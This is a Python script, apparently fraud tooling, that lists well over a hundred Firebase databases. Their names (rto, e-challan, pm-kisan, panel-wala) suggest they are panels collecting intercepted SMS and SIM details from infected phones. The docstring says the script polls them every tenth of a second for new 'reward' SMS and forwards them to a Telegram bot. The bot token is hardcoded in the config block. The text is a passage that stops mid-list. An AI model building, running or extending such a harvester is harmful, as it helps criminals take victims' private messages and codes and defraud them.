#!/usr/bin/env python3
"""
Reward SMS Monitor — INSTANT (panel shallow-diff + parallel deep fetch)
Strategy:
  1) Every ~0.1s wave: ALL panels in parallel → messages.json?shallow=true
  2) Only devices whose message-key set CHANGED get deep fetch (limitToLast)
  3) Instant Telegram alert on new reward SMS after START_TS
"""
import asyncio
import gc
import re
import time
import logging
from collections import deque
from typing import Dict, List, Optional, Set, Tuple

import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ══════════════ CONFIG ══════════════
BOT_TOKEN = "8917635169:AAH7fJyehZiI5H8H_F2u5c4H8BOjWsiEI0U"
ADMIN_ID = -5436668725

POLL_INTERVAL = 0.10
PANEL_CONC = 60          # parallel panels per wave
DEVICE_CONC = 200        # parallel deep SMS fetches
CHUNK = 80
MAX_SEEN = 100000
SMS_LAST = 5
RELOAD_EVERY = 180
MAX_ONLINE_PER_PANEL = 60
HTTP_TIMEOUT = 2.0
SHALLOW_TIMEOUT = 2.0

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("REWARD")

PANEL_FORMATS = {
  "https://admin-005-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-515ce-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-98208-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-eraju-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-no-024-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-panel-hub-f67a0-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://adminopinchat-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://adminzbabu-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ajay-9e1dc-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://all-he-8b285-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://amanop5100-754c2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://amramram-d7a15-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://angel-719a3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://anshu-cf72c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://apna-kam-bas-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ashok-e309e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://atifbhadu-bd0d2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://atifkaprojech-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://atifold-d560e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://aya-baby-34912-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://bablu-darknet-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://bajrang-bhai-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://balraj-7885-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://bandanob-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://belunder-2bd0e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://bholi72-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://bipin-38a0a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://bookfjk-246b2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://bosobeta-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://boss-7e6cb-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://brander-admin-panal-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://burmeinpani-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://chhotu754-442d0-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://chimam-23337-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://chod-patti-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://chunnu-d19ab-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://chutad-5eca0-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://dada-92f98-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://dcccde-cbeb0-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://deepak-yh-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://deepesh-randi-d0362-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://developerxhacker-8d065-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://dhapru-96d00-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://dhhdh-21eb2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://don-pannel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://e-challan-961fd-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://e4turnament2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ejeje-55f51-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://fifteenoct-a9041-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://fir-54f64-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://fir-a98e2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://fir-penal-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://fuck-4a817-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://gadiwala-7f08f-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://gahaha-7ad23-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ghost-panel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://goutam-ec678-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://hack-boss-9de0f-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://hahajj-8c5ab-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://hddjjd-fb399-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://honey-5cd25-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://htgibjiuuh-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ibhaiya-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://jackie-7a125-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://jajdghl-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://jddhh-2d245-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://jdid-50428-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://jocker-b1ca9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://joffrey-53f15-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://kajumyjann-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://kaka-8a1b1-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://kalaa-2fb53-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://kali-of-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://kaliya-413d2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://king-bihari-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://king-of-bihar-b278d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://kiy-a8a88-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://kundam-b2353-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ladh-cb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://lakhan-8d786-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://lali-c74e2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://lalp-34cfc-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://lavis-209b6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://laxm-6b90a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://lol41-51382-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://lucky-fa40a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ludasur-maharaj-dk-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://madhu838-18bac-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mafiyaboy-752c8-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://maja-d960d-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://manish-1f0d7-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://manishkkku-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mant2-f92ba-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://milestone-29655-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mith-admin-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mjnju-82283-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mkbccc-effb6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mmkk-6722e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mohan-e0b61-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://montulegend-39224-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://mosaji-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mpannel73-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mpariwan15-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mr-alone-59577-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mr-alone-b7cff-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mr-ram-ji-2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://mysiteheavdone972jsjs-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://nakure-6d9b9-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://nanichodu-a1820-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://neon-e4ce8-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://neru-e635f-default-rtdb.europe-west1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://new-panel1-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://new-pm-kisan-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://newwbee-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://nikki-panel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://nitaima-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://nothing-681cc-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://oct-2733d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://okay-6cf67-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ompanel777-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://opens-bb941-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ownerison-3da10-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": None}},
  "https://paisahipaisa-d9915-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://panel-65a86-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://panel-8029e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://panel-wala-v101-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v108-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v18-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v23-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v24-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v30-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v57-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v58-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v59-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v60-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v78-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v83-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v86-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v87-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v89-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v90-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panel-wala-v95-default-rtdb.firebaseio.com": {"fmt": "panel-wala", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://panelforss-default-rtdb.europe-west1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pani-1da70-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://papa-ji-6b42b-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://parvaer-89e4f-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://patienceop-ca26a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://penal-a93a8-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://personal-89997-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pikachcustomer-c8a55-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://pikachu-650de-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pillu-a1587-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pintu-admin-dec7e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pmkisan-admin-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pmyojana-7621e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://pogddsszx-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://prince-28541-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://proadmin-d029c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
